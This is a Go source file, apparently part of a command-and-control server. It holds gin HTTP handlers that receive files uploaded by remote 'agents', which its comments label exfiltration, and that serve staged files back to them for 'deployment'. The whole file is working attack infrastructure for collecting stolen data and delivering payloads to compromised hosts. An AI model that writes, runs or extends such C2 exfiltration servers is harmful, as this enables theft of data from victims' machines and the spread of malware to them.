package services

import (
	"fmt"
	"github.com/gin-gonic/gin"
	"net/http"
	"os"
	"path/filepath"
)

// Config
const StoragePath = "./storage/agent_files"

func InitTransfer() {
	// Ensure storage directory exists
	os.MkdirAll(StoragePath, 0755)
}

// Handler: Agent Uploads File (Exfiltration)
// POST /api/v1/transfer/upload
func HandleAgentUpload(c *gin.Context) {
	// 1. Get the file from Multipart form
	file, err := c.FormFile("file")
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "No file found"})
		return
	}

	// 2. Save file directly to disk (Streamed, low memory usage)
	// You might want to use the agent's ID or UUID in the path to separate files
	filename := filepath.Base(file.Filename)
	savePath := filepath.Join(StoragePath, filename)

	if err := c.SaveUploadedFile(file, savePath); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to save file"})
		return
	}

	fmt.Printf("[+] File Received from Agent: %s\n", savePath)
	c.JSON(http.StatusOK, gin.H{"status": "success", "path": savePath})
}

// Handler: Agent Downloads File (Deployment)
// GET /api/v1/transfer/download/:filename
func HandleAgentDownload(c *gin.Context) {
	filename := filepath.Base(c.Param("filename"))
	if filename == "." || filename == ".." || filename == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid filename"})
		return
	}
	targetPath := filepath.Join(StoragePath, filename)

	// Check if file exists
	if _, err := os.Stat(targetPath); os.IsNotExist(err) {
		c.JSON(http.StatusNotFound, gin.H{"error": "File not found"})
		return
	}

	// Serve file (Gin handles streaming efficiently)
	c.File(targetPath)
}
